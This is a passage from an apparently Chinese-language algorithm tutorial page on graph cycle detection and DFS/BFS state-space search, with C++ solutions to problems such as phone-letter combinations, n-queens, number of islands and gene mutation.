3&#125; 构建了图的主体结构，但在加入 &#123;2, 3&#125; 后，形成了一个环 1 → 2 → 3 → 1，因此 &#123;2, 3&#125; 是冗余边。</span><br><span class="hljs-comment">代码通过 DFS 递归检测邻居节点，如果发现某个已访问的节点不是当前节点的父节点，则说明有环出现。    </span><br><span class="hljs-comment">*/</span><br>    <br></code></pre></td></tr></table></figure><h4 id="环检测"><a href="#环检测" class="headerlink" title="环检测"></a><strong>环检测</strong></h4><p><strong>代码实现</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">bool</span> hasCycle = <span class="hljs-literal">false</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u, vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; to, vector&lt;<span class="hljs-type">bool</span>&gt;&amp; visited, vector&lt;<span class="hljs-type">bool</span>&gt;&amp; onPath)</span> </span>&#123;<br>    visited[u] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 标记当前节点为已访问</span><br>    onPath[u] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 当前节点位于递归路径上</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : to[u]) &#123;<br>        <span class="hljs-keyword">if</span> (!visited[v]) &#123;<br>            <span class="hljs-built_in">dfs</span>(v, to, visited, onPath);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (onPath[v]) &#123;<br>            hasCycle = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 检测到环</span><br>        &#125;<br>    &#125;<br>    onPath[u] = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 递归结束后，移除路径上的节点</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="十七-搜索"><a href="#十七-搜索" class="headerlink" title="十七.搜索"></a>十七.搜索</h2><h3 id="状态与状态空间搜索"><a href="#状态与状态空间搜索" class="headerlink" title="状态与状态空间搜索"></a><strong>状态与状态空间搜索</strong></h3><ul><li><p><strong>状态</strong>：</p><p>什么是状态?题面中涉及的所有数学信息，你在纸上人力计算时，关注的所有数据，一个函数访问的所有变量，例如最简单的计票问题，给n个名字，统计每个名字出现了多少次，你在纸上画“正”字统计的时候，关注了哪些数据?名字(n个字符串)，统计到哪个名字了(第1≤i≤n个名字)，画的“正”字(一个用于计数的数据结构，例如 Hash Map，就是程序维护的所有动态数据构成的集合，我们关注动态变化的变量</p></li><li><p><strong>状态空间</strong></p><p>所有可能状态构成的集合就是一个问题的状态空间，把状态作为点，如果从一个状态可以到达另一个状态，就连一条边这样就把整，状态空间抽象为了一张有向图，对问题的求解，就是对这张图的遍历，计票问题的状态空间由n个状态组成，可以看作一张n个点，n-1条边的有向图，整张图是一条链，自然就可以用一维循环解决了</p></li><li><p><strong>搜索算法</strong>：</p><ul><li><strong>深度优先搜索（DFS）</strong>：优先探索当前路径，深入到不能继续为止，再进行回溯。适用于需要遍历整棵搜索树或图的场景。</li><li><strong>广度优先搜索（BFS）</strong>：按照层次逐步扩展所有状态，适用于最短路径等需要找到最早解的场景。</li><li>一般来说，每个状态只遍历一次所以当状态空间是“图”而不是“树”时，要判重(记忆化)</li></ul></li></ul><h3 id="状态搜索的步骤"><a href="#状态搜索的步骤" class="headerlink" title="状态搜索的步骤"></a><strong>状态搜索的步骤</strong></h3><p>搜索题的解题步骤<br>1.纸上模拟，提取信息<br>2.定义状态<br>3.确定遍历顺序(DFS、BFS)<br>4.定义搜索框架<br>    如果是DFS，状态作为参数，确定递归边界，注意还原现场<br>    如果是BFS，状态用队列保存<br>    考虑是否需要判重<br>5.程序实现</p><p><strong>DFS 和 BFS 的比较</strong>：</p><ul><li><strong>深度优先搜索（DFS）</strong>：优先探索当前路径，深入到不能继续为止，再进行回溯。适用于需要遍历整棵搜索树或图的场景。</li><li><strong>广度优先搜索（BFS）</strong>：按照层次逐步扩展所有状态，适用于<code>最短</code>路径等需要找到<code>最早</code>解的场景。</li><li>状态空间为有向无环图或是求最大，最长<br>BFS拓扑排序&#x2F;DFS记忆化搜索均可,要去记一个dist路径</li></ul><hr><h3 id="例题-8"><a href="#例题-8" class="headerlink" title="例题"></a>例题</h3><h4 id="电话号码的字母组合问题："><a href="#电话号码的字母组合问题：" class="headerlink" title="电话号码的字母组合问题："></a>电话号码的字母组合问题：</h4><p>给定一个仅包含数字 <code>2-9</code> 的字符串，返回所有它能表示的字母组合。数字到字母的映射与电话按键一致。</p><p>例如：</p><ul><li>输入：”23”</li><li>输出：[“ad”, “ae”, “af”, “bd”, “be”, “bf”, “cd”, “ce”, “cf”]</li></ul><p><strong>思路</strong>：</p><ul><li><strong>递归（DFS）实现</strong>：该问题可以被看作是一个递归问题，每个数字对应多个字母，每个数字的字母组合都与前一个数字的字母组合进行全排列。</li><li><strong>状态转移</strong>：每个状态表示当前递归到第几个数字，每次递归时选择对应数字所映射的字母，生成所有可能的字母组合。</li></ul><p><strong>代码实现</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_LEN = <span class="hljs-number">10</span>;  <span class="hljs-comment">// 假设最多10个数字</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_RES = <span class="hljs-number">1000</span>;  <span class="hljs-comment">// 假设最多生成1000个结果</span><br><br>unordered_map&lt;<span class="hljs-type">char</span>, string&gt; alphabet;<br>string digits;<br>string ans[MAX_RES];  <span class="hljs-comment">// 用静态数组保存结果</span><br><span class="hljs-type">int</span> ans_size = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 结果的个数</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> index, string str)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (index == digits.<span class="hljs-built_in">length</span>()) &#123;<br>        ans[ans_size++] = str;  <span class="hljs-comment">// 保存结果</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : alphabet[digits[index]]) &#123;<br>        <span class="hljs-built_in">dfs</span>(index + <span class="hljs-number">1</span>, str + ch);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span> </span>&#123;<br>    alphabet[<span class="hljs-string">&#x27;2&#x27;</span>] = <span class="hljs-string">&quot;abc&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;3&#x27;</span>] = <span class="hljs-string">&quot;def&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;4&#x27;</span>] = <span class="hljs-string">&quot;ghi&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;5&#x27;</span>] = <span class="hljs-string">&quot;jkl&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;6&#x27;</span>] = <span class="hljs-string">&quot;mno&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;7&#x27;</span>] = <span class="hljs-string">&quot;pqrs&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;8&#x27;</span>] = <span class="hljs-string">&quot;tuv&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;9&#x27;</span>] = <span class="hljs-string">&quot;wxyz&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (digits.<span class="hljs-built_in">empty</span>()) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <br>    <span class="hljs-comment">// 输出所有结果</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ans_size; i++) &#123;<br>        cout &lt;&lt; ans[i] &lt;&lt; endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; digits;<br>    <span class="hljs-built_in">solve</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="n-皇后问题"><a href="#n-皇后问题" class="headerlink" title="n 皇后问题"></a>n 皇后问题</h4><p>给你一个整数 n，返回所有不同的 n 皇后问题 的解决方案。 每一种解法包含一个不同的 n 皇后问题的棋子放置方案，该方案中 ‘Q’ 和 ‘.’ 分别代表了皇后和空位。</p><p>输入：n &#x3D; 4<br>输出：[[“.Q..”,”…Q”,”Q…”,”..Q.”], [“..Q.”,”Q…”,”…Q”,”.Q..”]]<br>解释：如上图所示，4 皇后问题存在两个不同的解法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_N = <span class="hljs-number">15</span>;  <span class="hljs-comment">// 最大棋盘大小</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_ANS = <span class="hljs-number">100</span>;  <span class="hljs-comment">// 假设最多有100种解法</span><br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> ans_size = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 解法的数量</span><br><span class="hljs-type">int</span> p[MAX_N];  <span class="hljs-comment">// 存储每行皇后的列位置</span><br><span class="hljs-type">bool</span> used[MAX_N];  <span class="hljs-comment">// 标记列是否被占用</span><br>unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">bool</span>&gt; usedPlus;  <span class="hljs-comment">// 标记主对角线是否被占用</span><br>unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">bool</span>&gt; usedMinus;  <span class="hljs-comment">// 标记副对角线是否被占用</span><br>string result[MAX_ANS][MAX_N];  <span class="hljs-comment">// 存储解法，每个解法是一个棋盘的布局</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> row)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (row == n) &#123;<br>        <span class="hljs-comment">// 找到一个解法，将其保存</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-function">string <span class="hljs-title">s</span><span class="hljs-params">(n, <span class="hljs-string">&#x27;.&#x27;</span>)</span></span>;<br>            s[p[i]] = <span class="hljs-string">&#x27;Q&#x27;</span>;<br>            result[ans_size][i] = s;<br>        &#125;<br>        ans_size++;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> col = <span class="hljs-number">0</span>; col &lt; n; col++) &#123;<br>        <span class="hljs-keyword">if</span> (!used[col] &amp;&amp; !usedPlus[row + col] &amp;&amp; !usedMinus[row - col]) &#123;<br>            p[row] = col;<br>            used[col] = <span class="hljs-literal">true</span>;<br>            usedPlus[row + col] = <span class="hljs-literal">true</span>;<br>            usedMinus[row - col] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-built_in">dfs</span>(row + <span class="hljs-number">1</span>);<br>            usedMinus[row - col] = <span class="hljs-literal">false</span>;<br>            usedPlus[row + col] = <span class="hljs-literal">false</span>;<br>            used[col] = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">solveNQueens</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 输出所有解法</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ans_size; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            cout &lt;&lt; result[i][j] &lt;&lt; endl;<br>        &#125;<br>        cout &lt;&lt; endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; n;<br>    <span class="hljs-built_in">solveNQueens</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="岛屿数量"><a href="#岛屿数量" class="headerlink" title="岛屿数量"></a>岛屿数量</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_M = <span class="hljs-number">100</span>;  <span class="hljs-comment">// 最大行数</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_N = <span class="hljs-number">100</span>;  <span class="hljs-comment">// 最大列数</span><br><br><span class="hljs-type">int</span> m, n;<br><span class="hljs-type">char</span> grid[MAX_M][MAX_N];  <span class="hljs-comment">// 用静态数组表示网格</span><br><span class="hljs-type">bool</span> visited[MAX_M][MAX_N];  <span class="hljs-comment">// 用静态数组表示访问标记</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bfs</span><span class="hljs-params">(<span class="hljs-type">int</span> sx, <span class="hljs-type">int</span> sy)</span> </span>&#123;<br>    queue&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; q;<br>    q.<span class="hljs-built_in">push</span>(&#123;sx, sy&#125;);<br>    visited[sx][sy] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>().first;<br>        <span class="hljs-type">int</span> y = q.<span class="hljs-built_in">front</span>().second;<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            <span class="hljs-type">int</span> nx = x + dx[i];<br>            <span class="hljs-type">int</span> ny = y + dy[i];<br>            <span class="hljs-keyword">if</span> (nx &lt; <span class="hljs-number">0</span> || nx &gt;= m || ny &lt; <span class="hljs-number">0</span> || ny &gt;= n) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (grid[nx][ny] != <span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (visited[nx][ny]) <span class="hljs-keyword">continue</span>;<br>            q.<span class="hljs-built_in">push</span>(&#123;nx, ny&#125;);<br>            visited[nx][ny] = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">numIslands</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">memset</span>(visited, <span class="hljs-literal">false</span>, <span class="hljs-built_in">sizeof</span>(visited));  <span class="hljs-comment">// 初始化访问标记</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-keyword">if</span> (grid[i][j] == <span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; !visited[i][j]) &#123;<br>                ans++;<br>                <span class="hljs-built_in">bfs</span>(i, j);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; m &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            cin &gt;&gt; grid[i][j];<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-built_in">numIslands</span>() &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="基因突变问题"><a href="#基因突变问题" class="headerlink" title="基因突变问题"></a>基因突变问题</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX = <span class="hljs-number">1e4</span>; <span class="hljs-comment">// 假设字典中最多有 10000个元素</span><br>unordered_set&lt;string&gt; hasBank;  <span class="hljs-comment">// 存储所有的变换字符串</span><br>unordered_map&lt;string, <span class="hljs-type">int</span>&gt; depth;  <span class="hljs-comment">// 记录每个字符串的最短变换次数</span><br><br><span class="hljs-comment">// 字符集对应的字符数组</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> gene[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minMutation</span><span class="hljs-params">(<span class="hljs-type">char</span> start[<span class="hljs-number">9</span>], <span class="hljs-type">char</span> end[<span class="hljs-number">9</span>], <span class="hljs-type">char</span> bank[][<span class="hljs-number">9</span>], <span class="hljs-type">int</span> bankSize)</span> </span>&#123;<br>    <span class="hljs-comment">// 将所有的基因放入字典</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; bankSize; i++) &#123;<br>        hasBank.<span class="hljs-built_in">insert</span>(bank[i]);<br>    &#125;<br>    <span class="hljs-comment">// 如果目标字符串不在字典中，直接返回 -1</span><br>    <span class="hljs-keyword">if</span> (hasBank.<span class="hljs-built_in">find</span>(end) == hasBank.<span class="hljs-built_in">end</span>()) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-comment">// BFS 初始化</span><br>    queue&lt;string&gt; q;<br>    q.<span class="hljs-built_in">push</span>(start);<br>    depth[start] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>        string s = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-comment">// 遍历每个位置</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>                <span class="hljs-keyword">if</span> (s[i] != gene[j]) &#123;<br>                    string ns = s;<br>                    ns[i] = gene[j];<br>                    <span class="hljs-comment">// 如果新字符串在字典中，且尚未访问过</span><br>                    <span class="hljs-keyword">if</span> (hasBank.<span class="hljs-built_in">find</span>(ns) != hasBank.<span class="hljs-built_in">end</span>() &amp;&amp; depth.<span class="hljs-built_in">find</span>(ns) == depth.<span class="hljs-built_in">end</span>()) &#123;<br>                        depth[ns] = depth[s] + <span class="hljs-number">1</span>;<br>                        q.<span class="hljs-built_in">push</span>(ns);<br>                        <br>                        <span class="hljs-comment">// 找到目标字符串，返回最短变换步骤</span><br>                        <span class="hljs-keyword">if</span> (ns == end) <span class="hljs-keyword">return</span> depth[ns];<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 从输入中读取数据</span><br>    <span class="hljs-type">char</span> start[<span class="hljs-number">9</span>], end[<span class="hljs-number">9</span>];<br>    cin &gt;&gt; start &gt;&gt; end;<br>    <br>    <span class="hljs-type">int</span> bankSize;<br>    cin &gt;&gt; bankSize;<br>    <br>    <span class="hljs-type">char</span> bank[bankSize][<span class="hljs-number">9</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; bankSize; i++) &#123;<br>        cin &gt;&gt; bank[i];<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-built_in">minMutation</span>(start, end, bank, bankSize) &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="矩阵中的最长递增路径"><a href="#矩阵中的最长递增路径" class="headerlink" title="矩阵中的最长递增路径"></a><strong>矩阵中的最长递增路径</strong></h4><p>matrix &#x3D; [<br>  [9,9,4],<br>  [6,6,8],<br>  [2,1,1]<br>]</p><p><strong>最长路径计算</strong>：通过 BFS 遍历所有节点，记录每个节点的最长递增路径长度，最终获取最大值作为结果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 